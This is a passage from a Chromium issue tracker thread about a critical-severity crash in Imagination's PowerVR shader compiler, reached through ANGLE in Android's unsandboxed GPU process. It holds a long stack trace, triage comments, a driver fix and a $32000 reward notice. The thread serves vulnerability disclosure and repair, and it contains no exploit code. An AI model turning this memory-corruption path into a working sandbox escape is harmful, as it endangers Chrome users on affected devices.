  0000000000cfbf3c  glsl::glslModule::ProcessNodeArraySpecifier(GLSLNodeTAG const*, bool)+572) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05c14  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2900) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000cf4dac  glsl::glslModule::ProcessNodeFieldSelection(GLSLNodeTAG const*, bool)+364) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05bfc  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2876) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000cfbf3c  glsl::glslModule::ProcessNodeArraySpecifier(GLSLNodeTAG const*, bool)+572) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05c14  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2900) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000cf4dac  glsl::glslModule::ProcessNodeFieldSelection(GLSLNodeTAG const*, bool)+364) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05bfc  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2876) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000cfbf3c  glsl::glslModule::ProcessNodeArraySpecifier(GLSLNodeTAG const*, bool)+572) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05c14  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2900) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d0fd94  glsl::glslValue::EvaluateNodeAsValue(GLSLNodeTAG const*, bool)+148) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000cfc7d8  glsl::glslModule::ProcessNodeEQUAL(GLSLNodeTAG const*, bool)+632) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05c98  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+3032) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d0fd94  glsl::glslValue::EvaluateNodeAsValue(GLSLNodeTAG const*, bool)+148) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d015ec  glsl::glslModule::ProcessNodeExpression(GLSLNodeTAG const*, bool)+108) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05a54  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2452) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d0fd94  glsl::glslValue::EvaluateNodeAsValue(GLSLNodeTAG const*, bool)+148) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d015ec  glsl::glslModule::ProcessNodeExpression(GLSLNodeTAG const*, bool)+108) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05a54  glsl::glslModule::EvaluateStatementNode(GLSLNodeTAG const*, glsl::_EVM_)+2452) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d009c8  glsl::glslModule::ICTraverseASTAndAddToLLVM(GLSLNodeTAG const*)+280) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d02018  glsl::glslModule::AddNodeSWITCH(GLSLNodeTAG const*)+408) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d009c8  glsl::glslModule::ICTraverseASTAndAddToLLVM(GLSLNodeTAG const*)+280) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d035ec  glsl::glslModule::AddNodeSHADER(GLSLNodeTAG const*)+3708) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d05ea0  glsl::glslModule::TranslateASTreeToLLVMIR(GLSLTreeContextTAG const*)+336) (BuildId: 3669c3a3441cf03574357745e0fc3241  /vendor/lib64/libufwriter.so
  0000000000d47214  GenerateICodeProgram+2052) (BuildId: 3669c3a3441cf03574357745e0fc3241             /vendor/lib64/libufwriter.so
  0000000000c93d64  GLSLCompileToIntermediateCode+1220) (BuildId: 3669c3a3441cf03574357745e0fc3241    /vendor/lib64/libufwriter.so
  0000000000c94218  GLSLCompileToUniflex+776) (BuildId: 3669c3a3441cf03574357745e0fc3241              /vendor/lib64/libufwriter.so
  0000000000121244  DoCompileShader(GLES3Context_TAG*, GLES3DeferredShaderCompileContextRec*, GLES3CompilerAppHintSetupRec const*, GLSLProgramTypeTAG, char const*, GLSLIntermediateTAG const*, GLES3RecompiledShaderConditionRec*, GLES3CompiledShaderStateRec*, unsigned int, GLES3ShaderRec*) (.__uniq.240097599076884967950137398077872991440)+644) (BuildId: 5c09bdbf5bedc8055689e500629872cc  /vendor/lib64/egl/libGLESv2_powervr.so
  000000000011fa9c  CompileShader+252) (BuildId: 5c09bdbf5bedc8055689e500629872cc                     /vendor/lib64/egl/libGLESv2_powervr.so
  000000000011aa24  glCompileShader+100) (BuildId: 5c09bdbf5bedc8055689e500629872cc                   /vendor/lib64/egl/libGLESv2_powervr.so
  v------>  rx::(anonymous namespace)::ShaderTranslateTaskGL::startCompile(gl::CompiledShaderState const&)  ../../third_party/angle/src/libANGLE/renderer/gl/ShaderGL.cpp:96:9
  000000000343cbbc  rx::(anonymous namespace)::ShaderTranslateTaskGL::postTranslate(void*, gl::CompiledShaderState const&)  ../../third_party/angle/src/libANGLE/renderer/gl/ShaderGL.cpp:40:9
  v------>  gl::(anonymous namespace)::CompileTask::postTranslate()                           ../../third_party/angle/src/libANGLE/Shader.cpp:331:21
  v------>  gl::(anonymous namespace)::CompileTask::compileImpl()                             ../../third_party/angle/src/libANGLE/Shader.cpp:213:16
  0000000003369910  gl::(anonymous namespace)::CompileTask::operator()()                              ../../third_party/angle/src/libANGLE/Shader.cpp:124:44
  0000000008280d74  angle::SingleThreadedWorkerPool::postWorkerTask(std::__Cr::shared_ptr<angle::Closure> const&)  ../../third_party/angle/src/common/WorkerThread.cpp:83:5
  000000000330bda4  gl::Context::postCompileLinkTask(std::__Cr::shared_ptr<angle::Closure> const&, angle::JobThreadSafety, angle::JobResultExpectancy) const  ../../third_party/angle/src/libANGLE/Context.cpp:9304:24
  0000000003368148  gl::Shader::compile(gl::Context const*, angle::JobResultExpectancy)               ../../third_party/angle/src/libANGLE/Shader.cpp:744:18
  00000000082c424c  GL_CompileShader                                                                  ../../third_party/angle/src/libGLESv2/entry_points_gles_2_0_autogen.cpp:921:22
  0000000008f53028  gpu::gles2::GLES2DecoderPassthroughImpl::DoCompileShader(unsigned int)            ../../gpu/command_buffer/service/gles2_cmd_decoder_passthrough_doers.cc:733:10
  0000000008f4a988  gpu::error::Error gpu::gles2::GLES2DecoderPassthroughImpl::DoCommandsImpl<false>(unsigned int, void const volatile*, int, int*)  ../../gpu/command_buffer/service/gles2_cmd_decoder_passthrough.cc:742:20
  0000000003caaeac  gpu::CommandBufferService::Flush(int, gpu::AsyncAPIInterface*)                    ../../gpu/command_buffer/service/command_buffer_service.cc:267:35
  v------>  std::__Cr::unique_ptr<gpu::CommandBufferService, std::__Cr::default_delete<gpu::CommandBufferService>>::operator->() const  gen/third_party/libc++/src/include/__memory/unique_ptr.h:265:101
  000000000900be5c  gpu::CommandBufferStub::OnAsyncFlush(int, unsigned int, std::__Cr::vector<gpu::SyncToken, std::__Cr::allocator<gpu::SyncToken>> const&)  ../../gpu/ipc/service/command_buffer_stub.cc:504:5
  v------>  std::__Cr::unique_ptr<gpu::mojom::AsyncFlushParams, std::__Cr::default_delete<gpu::mojom::AsyncFlushParams>>::operator*() const  gen/third_party/libc++/src/include/__memory/unique_ptr.h:263:13
  v------>  mojo::StructPtr<gpu::mojom::AsyncFlushParams>::operator*() const                  ../../mojo/public/cpp/bindings/struct_ptr.h:82:12
  000000000900bba0  gpu::CommandBufferStub::ExecuteDeferredRequest(gpu::mojom::DeferredCommandBufferRequestParams&, gpu::FenceSyncReleaseDelegate*)  ../../gpu/ipc/service/command_buffer_stub.cc:172:21
  v------>  std::__Cr::unique_ptr<gpu::mojom::DeferredCommandBufferRequestParams, std::__Cr::default_delete<gpu::mojom::DeferredCommandBufferRequestParams>>::operator*() const  gen/third_party/libc++/src/include/__memory/unique_ptr.h:263:13
  v------>  mojo::StructPtr<gpu::mojom::DeferredCommandBufferRequestParams>::operator*() const  ../../mojo/public/cpp/bindings/struct_ptr.h:82:12
  0000000009011570  gpu::GpuChannel::ExecuteDeferredRequest(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*)  ../../gpu/ipc/service/gpu_channel.cc:833:36
  v------>  void base::internal::DecayedFunctorTraits<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>::Invoke<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel> const&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&, gpu::FenceSyncReleaseDelegate*&&)  ../../base/functional/bind_internal.h:740:12
  v------>  void base::internal::InvokeHelper<true, base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, void, 0ul, 1ul>::MakeItSo<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, gpu::FenceSyncReleaseDelegate*>(void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>&&, gpu::FenceSyncReleaseDelegate*&&)  ../../base/functional/bind_internal.h:956:5
  v------>  void base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunImpl<void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, 0ul, 1ul>(void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), std::__Cr::tuple<base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul>, gpu::FenceSyncReleaseDelegate*&&)  ../../base/functional/bind_internal.h:1069:14
  0000000009014030  base::internal::Invoker<base::internal::FunctorTraits<void (gpu::GpuChannel::*&&)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>&&, mojo::StructPtr<gpu::mojom::DeferredRequestParams>&&>, base::internal::BindState<true, true, false, void (gpu::GpuChannel::*)(mojo::StructPtr<gpu::mojom::DeferredRequestParams>, gpu::FenceSyncReleaseDelegate*), base::WeakPtr<gpu::GpuChannel>, mojo::StructPtr<gpu::mojom::DeferredRequestParams>>, void (gpu::FenceSyncReleaseDelegate*)>::RunOnce(base::internal::BindStateBase*, gpu::FenceSyncReleaseDelegate*)  ../../base/functional/bind_internal.h:982:12
  v------>  base::OnceCallback<void (media::DemuxerStream*)>::Run(media::DemuxerStream*) &&   ../../base/functional/callback.h:155:12
  v------>  void base::internal::DecayedFunctorTraits<base::OnceCallback<void (media::DemuxerStream*)>, media::DemuxerStream*&&>::Invoke<base::OnceCallback<void (media::DemuxerStream*)>, media::DemuxerStream*>(base::OnceCallback<void (media::DemuxerStream*)>&&, media::DemuxerStream*&&)  ../../base/functional/bind_internal.h:815:49
  v------>  void base::internal::InvokeHelper<false, base::internal::FunctorTraits<base::OnceCallback<void (media::DemuxerStream*)>&&, media::DemuxerStream*&&>, void, 0ul>::MakeItSo<base::OnceCallback<void (media::DemuxerStream*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>>(base::OnceCallback<void (media::DemuxerStream*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&)  ../../base/functional/bind_internal.h:932:12
  v------>  void base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (media::DemuxerStream*)>&&, media::DemuxerStream*&&>, base::internal::BindState<false, true, true, base::OnceCallback<void (media::DemuxerStream*)>, base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunImpl<base::OnceCallback<void (media::DemuxerStream*)>, std::__Cr::tuple<base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, 0ul>(base::OnceCallback<void (media::DemuxerStream*)>&&, std::__Cr::tuple<base::internal::UnretainedWrapper<media::DemuxerStream, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>&&, std::__Cr::integer_sequence<unsigned long, 0ul>)  ../../base/functional/bind_internal.h:1069:14
  0000000003880e88  base::internal::Invoker<base::internal::FunctorTraits<base::OnceCallback<void (void const*)>&&, collaboration::CollaborationController*&&>, base::internal::BindState<false, true, true, base::OnceCallback<void (void const*)>, base::internal::UnretainedWrapper<collaboration::CollaborationController, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*)  ../../base/functional/bind_internal.h:982:12
  v------>  base::OnceCallback<void ()>::Run() &&                                             ../../base/functional/callback.h:155:12
  0000000003cb01bc  gpu::Scheduler::ExecuteSequence(base::IdType<gpu::SyncPointOrderData, unsigned int, 0u, 1u>)  ../../gpu/command_buffer/service/scheduler.cc:707:29
  0000000003caf9bc  gpu::Scheduler::RunNextTask()                                                     ../../gpu/command_buffer/service/scheduler.cc:625:3
  v------>  base::OnceCallback<void ()>::Run() &&                                             ../../base/functional/callback.h:155:12
  00000000066be220  base::TaskAnnotator::RunTaskImpl(base::PendingTask&)                              ../../base/task/common/task_annotator.cc:229:34
  v------>  void base::TaskAnnotator::RunTask<base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3>(perfetto::StaticString, base::PendingTask&, base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)::$_3&&)  ../../base/task/common/task_annotator.h:112:5
  00000000066d850c  base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)  ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:475:23
  00000000066d8128  base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()   ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
  0000000006674a64  base::MessagePumpDefault::Run(base::MessagePump::Delegate*)                       ../../base/message_loop/message_pump_default.cc:42:55
  00000000066d8b24  base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)  ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
  000000000669f6b8  base::RunLoop::Run(base::Location const&)                                         ../../base/run_loop.cc:135:14
  v------>  unsigned char std::__Cr::__cxx_atomic_load<unsigned char>(std::__Cr::__cxx_atomic_base_impl<unsigned char> const*, std::__Cr::memory_order)  gen/third_party/libc++/src/include/__atomic/support/c11.h:81:10
  v------>  std::__Cr::__atomic_base<unsigned char, false>::load(std::__Cr::memory_order) const  gen/third_party/libc++/src/include/__atomic/atomic.h:71:12
  v------>  void perfetto::DataSource<perfetto::internal::TrackEventDataSource, perfetto::internal::TrackEventDataSourceTraits>::CallIfEnabled<perfetto::internal::TrackEvent<&base::perfetto_track_event::internal::kCategoryRegistry>::CategoryTracePointTraits, void perfetto::internal::TrackEvent<&base::perfetto_track_event::internal::kCategoryRegistry>::CallIfCategoryEnabled<content::GpuMain(content::MainFunctionParams)::$_2::operator()() const::'lambda0'(unsigned int)>(unsigned long, content::GpuMain(content::MainFunctionParams)::$_2::operator()() const::'lambda0'(unsigned int))::'lambda'(unsigned int)>(void perfetto::internal::TrackEvent<&base::perfetto_track_event::internal::kCategoryRegistry>::CallIfCategoryEnabled<content::GpuMain(content::MainFunctionParams)::$_2::operator()() const::'lambda0'(unsigned int)>(unsigned long, content::GpuMain(content::MainFunctionParams)::$_2::operator()() const::'lambda0'(unsigned int))::'lambda'(unsigned int), content::GpuMain(content::MainFunctionParams)::$_2::operator()() const::'lambda0'(unsigned int)::TracePointData)  ../../third_party/perfetto/include/perfetto/tracing/data_source.h:429:32
  v------>  void perfetto::internal::TrackEvent<&base::perfetto_track_event::internal::kCategoryRegistry>::CallIfCategoryEnabled<content::GpuMain(content::MainFunctionParams)::$_2::operator()() const::'lambda0'(unsigned int)>(unsigned long, content::GpuMain(content::MainFunctionParams)::$_2::operator()() const::'lambda0'(unsigned int))  ../../third_party/perfetto/include/perfetto/tracing/internal/track_event_data_source.h:460:5
  v------>  content::GpuMain(content::MainFunctionParams)::$_2::operator()() const            ../../content/gpu/gpu_main.cc:478:5
  000000000bff93f0  content::GpuMain(content::MainFunctionParams)                                     ../../content/gpu/gpu_main.cc:478:5
  000000000664fe24  content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*)  ../../content/app/content_main_runner_impl.cc:762:14
  0000000006650cc4  content::ContentMainRunnerImpl::Run()                                             ../../content/app/content_main_runner_impl.cc:1152:10
  000000000664e838  content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)  ../../content/app/content_main.cc:358:36
  000000000664f7ac  content::StartContentMain(bool)                                                   ../../content/app/android/content_main_android.cc:54:10
  00000000002c2300  art_quick_generic_jni_trampoline+144) (BuildId: 61c7a211c01ef3c0068b4fbe31051050  /apex/com.android.art/lib64/libart.so
  00000000006683e8  nterp_helper+152) (BuildId: 61c7a211c01ef3c0068b4fbe31051050                      /apex/com.android.art/lib64/libart.so
  0000000000289a3e  offset 0x1edb000) (lg1.run+570                                                    /data/app/~~KWO0JD6yPlW7SmjbtNZrAg==/org.chromium.chrome-2Z0tgytiLSC8EPEj3neBRw==/base.apk/libmonochrome.so
  000000000031d5f0  java.lang.Thread.run+64                                                           /data/misc/apexdata/com.android.art/dalvik-cache/arm64/boot.oat
  00000000002aaf94  art_quick_invoke_stub+612) (BuildId: 61c7a211c01ef3c0068b4fbe31051050             /apex/com.android.art/lib64/libart.so
  00000000002709b0  art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+220) (BuildId: 61c7a211c01ef3c0068b4fbe31051050  /apex/com.android.art/lib64/libart.so
  00000000004bdfc8  art::Thread::CreateCallback(void*)+1184) (BuildId: 61c7a211c01ef3c0068b4fbe31051050  /apex/com.android.art/lib64/libart.so
  00000000004bdb18  art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: 61c7a211c01ef3c0068b4fbe31051050  /apex/com.android.art/lib64/libart.so
  000000000008a314  __pthread_start(void*) (.__uniq.67847048707805468364044055584648682506)+180) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37  /apex/com.android.runtime/lib64/bionic/libc.so
  000000000007b1f4  __start_thread+68) (BuildId: 5e0a77ba8573ea8c77efcf596e9edd37                     /apex/com.android.runtime/lib64/bionic/libc.so


```

### pe...@google.com (2026-02-27)

Thank you for providing more feedback. Adding the requester to the CC list.

### aj...@google.com (2026-02-27)

Thanks I'm unable to repro myself today but assigning Critical Severity (S0) as this is a bug in Android's unsandboxed gpu process.

### aj...@google.com (2026-02-27)

-> geofflang to pick someone to take a look

### aj...@google.com (2026-02-27)

reporter: thanks for the stack it helps us understand if we can do something about this is Chrome, or if it needs a gpu driver fix.

### kb...@chromium.org (2026-02-27)

Geoff is on vacation and will probably be busy catching up when he gets back.

Shabi, could you please triage this and see if there's any obvious validation that could be added to the shader translator which could prevent this driver crash from happening?

### kb...@chromium.org (2026-02-27)

Filed internal [Bug 488401337](https://issues.chromium.org/issues/488401337) against Imagination's graphics driver. It's unclear whether additional validation or transformation in ANGLE's shader translator could work around this crash in the driver's shader compiler.

### ch...@google.com (2026-02-28)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-28)

Setting Priority to P0 to match Severity s0. To ensure SLOs are tracked correctly, priority must exceed severity.

### sy...@chromium.org (2026-03-02)

I'm on vacation this week instead, so back to Geoff!

### ge...@google.com (2026-03-06)

This bug has been reproduced by the Pixel team, the vendor is looking into it and I will work around it at the ANGLE/Chrome level once we know more.

### ch...@google.com (2026-03-17)

geofflang: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ge...@google.com (2026-03-17)

This was just fixed internally in the driver in ag/38893977 and should go out with the next device update. I'm going to close this out.

### ch...@google.com (2026-03-18)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M146. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M147. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [146, 147].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ge...@chromium.org (2026-03-18)

No merge needed.

### sp...@google.com (2026-04-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $32000.00 for this report.

Rationale for this decision:
Baseline. Sandbox escape / Memory corruption in a non-sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-24)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485945891)*
